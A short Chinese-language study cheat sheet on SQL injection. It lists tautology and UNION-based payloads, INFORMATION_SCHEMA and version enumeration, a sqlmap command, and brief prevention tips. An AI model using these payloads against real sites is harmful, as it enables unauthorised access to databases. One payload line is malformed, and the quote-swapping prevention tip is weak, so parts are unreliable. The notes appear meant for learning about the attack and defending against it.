# cheetsheet

## SQL Injection 隱碼攻擊

Introduction 
發生於應用程式之資料庫層的安全漏洞
是輸入的字串之中夾帶 SQL 指令
若程式未過濾，夾帶進去的指令會被資料庫 Server 認為是正常的 SQL 指令執行

1. 最簡單語法 
' or 1=1 # (# 代表後方皆省略)

2. UNION 可以將兩個 SELECT 結合在一起查詢
'UNION SELECT 1,2,3,4# (用這個可以慢慢找出欄位數)
'UNION SELECT ORDER BY 2# (與上方同理)

3. 系統資訊結構描述
一般 SQL 資料庫中都會有一個表格是 "系統資訊結構描述" ，表格名為 Information Schema，亦可透過 UNION 方式檢視 Table Name、Column Name
'UNION SELECT  TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS#

4. 查出資料庫版本、資料庫名稱
透過版本直接上網查是不是有已知漏洞可以打
'UNION SELECT @@version,database()#

5. SQL 檢測工具 - SQLMAP (未用過)
此工具用來檢視是否有 SQL Injection，程式將 SQL Injection 攻擊語法集結而成，透過此可對網站進行滲透
COMMAND:
sqlmap -u [URL] --dbs

預防方式建議:
1. 使用正規化的方式驗證過濾輸入值，可以將 SQL 指令過濾掉，或將單引號變換為雙引號
2. 在不需要使用到更新、插入資料時，資料庫以 view 的方式處理供使用者查詢資料
3. 將伺服器與資料庫部署在不同的機器上


